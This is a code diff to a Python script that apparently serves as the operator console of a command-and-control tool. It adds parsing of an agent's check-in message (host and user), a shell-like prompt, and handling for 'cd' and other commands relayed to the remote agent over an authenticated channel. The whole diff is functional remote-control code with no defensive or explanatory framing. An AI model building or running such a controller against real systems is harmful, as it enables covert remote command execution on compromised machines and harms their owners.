@@ -53,12 +53,14 @@ def main():
         print("[!] Failled authentication.")
         sys.exit()
     success_msg = chan.recv(1024).decode()
-    print(f"{success_msg}")
+    host = success_msg.split(",")[0]
+    user = success_msg.split(",")[1]
+    print(f"[*] Agent checked in from \"{host}\" as \"{user}\".\n")
     chan.send(" ") #Connection breaks without this line
     def comm_handler():
         try:
             while True:
-                cmd_line = ("> ")
+                cmd_line = (f">> {user}@{host} ~$ ")
                 command = input(cmd_line + "")
                 """
                 if command == "get_users":
@@ -73,6 +75,15 @@ def main():
                 if command == "exit":
                     chan.send(command)
                     sys.exit()
+                if command.split(" ")[0] == "cd":
+                    chan.send(command)
+                    output = chan.recv(1024)
+                    status = output.decode()
+                    if status.split(",")[0] == "True":
+                        CWD = status.split(",")[1]
+                        print(f"Changed directory to \"{CWD}\"\n")
+                    else:
+                        print(status)
                 else:
                     try:
                         chan.send(command)
